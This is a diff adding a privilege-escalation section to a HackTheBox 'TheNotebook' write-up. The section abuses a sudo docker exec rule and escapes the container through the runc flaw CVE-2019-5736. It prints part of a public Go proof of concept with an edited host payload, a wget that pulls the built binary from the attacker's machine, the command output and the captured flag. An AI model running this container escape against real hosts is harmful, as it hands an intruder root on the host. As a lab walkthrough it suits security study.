@@ -593,11 +593,135 @@ f718987c00ff7b8d1bd826e1f881625e
 
 # Privilege Escalation#2
 
+```
+noah@thenotebook:~$ sudo -l
+Matching Defaults entries for noah on thenotebook:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
+User noah may run the following commands on thenotebook:
+    (ALL) NOPASSWD: /usr/bin/docker exec -it webapp-dev01*
+```
 
+Let's run it
+
+```
+noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
+root@0f4c2517af40:/opt/webapp# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+And we are in docker container with root's privileges.
+
+Let's find some ways to escape. 
+
+But this [way](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout) doesn't work...
+
+Run LiNPEAS script and find information about vulnerability in *Runс*.
+
+```
+[+] Checking if runc is available                                                                                 
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/runc-privilege-escalation
+runc was found in /usr/sbin/runc, you may be able to escalate privileges with it  
+```
+
+```
+noah@thenotebook:~$ runc -v
+runc version 1.0.0~rc6+dfsg1
+commit: 1.0.0~rc6+dfsg1-3
+spec: 1.0.1
+```
+
+After googling find these articles
+
+* https://habr.com/ru/company/flant/blog/439964/
+* https://www.exploit-db.com/exploits/46369
+* https://github.com/Frichetten/CVE-2019-5736-PoC
+
+Nice, we have root in the docker container. It is our way.
+
+We will use POC from github. Download *main.go* to kali and edit *var payload*.
+
+```
+┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
+└─# cat main.go                                                                                               1 ⨯
+package main
+
+// Implementation of CVE-2019-5736
+// Created with help from @singe, @_cablethief, and @feexd.
+// This commit also helped a ton to understand the vuln
+// https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d
+import (
+        "fmt"
+        "io/ioutil"
+        "os"
+        "strconv"
+        "strings"
+)
+
+// This is the line of shell commands that will execute on the host
+var payload = "#!/bin/bash \n cat /root/root.txt > /tmp/root.txt && chmod 777 /tmp/root.txt"
+
+func main() {
+        // First we overwrite /bin/sh with the /proc/self/exe interpreter path
+        fd, err := os.Create("/bin/sh")
+        if err != nil {
+```
+
+Next step is creating binary file
+
+```
+┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
+└─# go build main.go                                                                                              
+┌──(root💀kali)-[/home/kali/HTB/TheNotebook]
+└─# ls                                                                                                            
+home         jwt       main     noah.txt     privKey.key.pub  wwwdata.txt
+home.tar.gz  jwt_tool  main.go  privKey.key  rev.php          www.txt
+```
+
+Upload *main* ro the docker container and run it.
+
+```
+noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/bash
+root@0f4c2517af40:/opt/webapp# cd /tmp
+root@0f4c2517af40:/tmp# wget http://10.10.16.5:8000/main
+--2021-03-18 08:14:58--  http://10.10.16.5:8000/main
+Connecting to 10.10.16.5:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2140239 (2.0M) [application/octet-stream]
+Saving to: ‘main’
+
+main                         100%[============================================>]   2.04M   241KB/s    in 14s     
+
+2021-03-18 08:15:12 (149 KB/s) - ‘main’ saved [2140239/2140239]
+
+root@0f4c2517af40:/tmp# ls
+main  requirements.txt  webapp.db
+root@0f4c2517af40:/tmp# chmod +x main
+root@0f4c2517af40:/tmp# ./main
+[+] Overwritten /bin/sh successfully
+
+```
+
+In the another terminal run docker container again and we get root.txt
+
+```
+noah@thenotebook:~$ sudo /usr/bin/docker exec -it webapp-dev01 /bin/sh
+No help topic for '/bin/sh'
+noah@thenotebook:~$ ls /tmp
+root.txt                                                                           vmware-root_614-2722697888
+systemd-private-2bb89a2306424a26841a7b7df8313f9c-systemd-timesyncd.service-7ndNnm
+noah@thenotebook:~$ cat /tmp/root.txt
+19c809f1fd1936d42702a37869bc0ecc
+```
 
 # Result and Resources
 
-1. h
-2. h
+1. https://jwt.io/
+2. https://habr.com/ru/post/450054/
+3. https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/
+4. https://github.com/Frichetten/CVE-2019-5736-PoC
+5. https://www.exploit-db.com/exploits/46369
+6. https://habr.com/ru/company/flant/blog/439964/
+7. https://tzusec.com/how-to-install-golang-in-kali-linux/
 
